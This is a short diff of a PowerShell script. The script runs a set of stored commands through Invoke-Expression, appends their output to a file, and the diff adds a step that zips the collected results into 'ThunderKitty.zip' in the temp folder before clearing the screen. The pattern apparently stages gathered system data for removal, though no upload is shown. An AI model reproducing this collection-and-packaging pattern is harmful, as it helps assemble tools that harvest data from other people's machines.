@@ -126,5 +126,8 @@ foreach ($key in $scrp.Keys) {
     $put = Invoke-Expression $scrp[$key]
     Add-Content -Path $thunder -Value $put
 }
+$tempPath = [System.IO.Path]::GetTempPath()
+Compress-Archive -LiteralPath $windkitty2save -DestinationPath "$tempPath\ThunderKitty.zip"
 cls
+
 
